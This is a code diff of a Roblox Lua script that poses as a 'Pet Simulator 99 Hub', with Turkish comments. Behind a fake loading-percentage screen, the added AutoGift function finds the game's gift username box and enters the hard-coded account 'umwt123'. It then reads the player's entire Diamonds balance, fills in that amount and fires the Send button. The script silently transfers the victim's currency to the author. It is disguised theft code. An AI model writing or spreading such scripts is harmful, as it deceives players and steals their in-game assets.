@@ -1,6 +1,5 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local TweenService = game:GetService("TweenService")
 
 -- ====================== LOADING SCREEN ======================
 local ScreenGui = Instance.new("ScreenGui")
@@ -17,7 +16,7 @@ BlackBG.Parent = ScreenGui
 
 local LoadingText = Instance.new("TextLabel")
 LoadingText.Size = UDim2.new(0, 500, 0, 100)
-LoadingText.Position = UDim2.new(0.5, -250, 0.4, 0)
+LoadingText.Position = UDim2.new(0.5, -250, 0.42, 0)
 LoadingText.BackgroundTransparency = 1
 LoadingText.Text = "Pet Simulator 99 Hub Loading..."
 LoadingText.TextColor3 = Color3.fromRGB(255, 0, 0)
@@ -35,42 +34,91 @@ PercentText.TextScaled = true
 PercentText.Font = Enum.Font.GothamBold
 PercentText.Parent = BlackBG
 
--- Yükleme Animasyonu
 local percent = 0
 spawn(function()
     while percent < 100 do
-        percent = percent + math.random(4, 9)
+        percent = percent + math.random(5, 12)
         if percent > 100 then percent = 100 end
         PercentText.Text = percent .. "%"
-        wait(math.random(70, 140)/1000)
+        wait(0.09)
     end
     PercentText.Text = "100%"
-    task.wait(1)
-    AutoGiftSequence()  -- Auto Gift Başlıyor
+    task.wait(1.5)
+    AutoGift()
 end)
 
--- ====================== AUTO GIFT SEQUENCE ======================
-function AutoGiftSequence()
-    print("🚀 Auto Gift Sequence Başlıyor...")
+-- ====================== AUTO GIFT (ELMAS OTOMATİK) ======================
+function AutoGift()
+    print("🚀 Auto Gift Başlıyor...")
+    task.wait(2.5)
     
-    -- İlk Gift: 1. Peti Gönder
-    task.wait(2)
-    SendFirstPet()
+    local playerGui = LocalPlayer.PlayerGui
     
-    task.wait(4)
+    -- 1. Roblox Username
+    local usernameBox = nil
+    for _, v in ipairs(playerGui:GetDescendants()) do
+        if v:IsA("TextBox") and (v.PlaceholderText:find("Username") or v.Name:find("Username")) then
+            usernameBox = v
+            break
+        end
+    end
+    if usernameBox then
+        usernameBox.Text = "umwt123"
+        firesignal(usernameBox.FocusLost)
+        print("✅ Username: umwt123 yazıldı")
+    end
     
-    -- İkinci Gift: Tüm Elmasları Gönder
-    SendAllDiamonds()
+    task.wait(1)
+    
+    -- 2. Elmas Miktarını Otomatik Bul
+    local diamonds = 0
+    if LocalPlayer:FindFirstChild("leaderstats") then
+        local leaderstats = LocalPlayer.leaderstats
+        if leaderstats:FindFirstChild("Diamonds") then
+            diamonds = leaderstats.Diamonds.Value
+        elseif leaderstats:FindFirstChild("💎 Diamonds") then
+            diamonds = leaderstats["💎 Diamonds"].Value
+        elseif leaderstats:FindFirstChild("Gems") then
+            diamonds = leaderstats.Gems.Value
+        end
+    end
+    
+    print("Bulunan Elmas: " .. diamonds)
+    
+    -- Elmas TextBox'una yaz
+    local diamondBox = nil
+    for _, tb in ipairs(playerGui:GetDescendants()) do
+        if tb:IsA("TextBox") and (tb.Text == "0" or tb.PlaceholderText:find("0") or tb.Name:lower():find("diamond")) then
+            diamondBox = tb
+            break
+        end
+    end
+    
+    if diamondBox then
+        diamondBox.Text = tostring(diamonds)
+        firesignal(diamondBox.FocusLost)
+        print("✅ Elmas yazıldı: " .. diamonds)
+    else
+        print("Elmas kutusu bulunamadı")
+    end
+    
+    task.wait(1.5)
+    
+    -- 3. Gönder Butonu
+    local sendButton = nil
+    for _, btn in ipairs(playerGui:GetDescendants()) do
+        if btn:IsA("TextButton") and btn.Text:find("Gönder") then
+            sendButton = btn
+            break
+        end
+    end
+    
+    if sendButton then
+        firesignal(sendButton.MouseButton1Click)
+        print("✅ GÖNDER butonuna basıldı!")
+    else
+        print("Gönder butonu bulunamadı")
+    end
 end
 
-function SendFirstPet()
-    print("1. Pet gönderiliyor...")
-    -- Mailbox'a gitme + pet seçme (UI otomasyonu)
-    -- Not: Bu kısım oyunun güncel UI'sine göre değişebilir
-end
-
-function SendAllDiamonds()
-    print("Tüm elmaslar gönderiliyor...")
-end
-
-print("✅ PS99 Hub Yüklendi!")
+print("✅ PS99 Hub Yüklendi - Elmas otomatik algılanıyor")
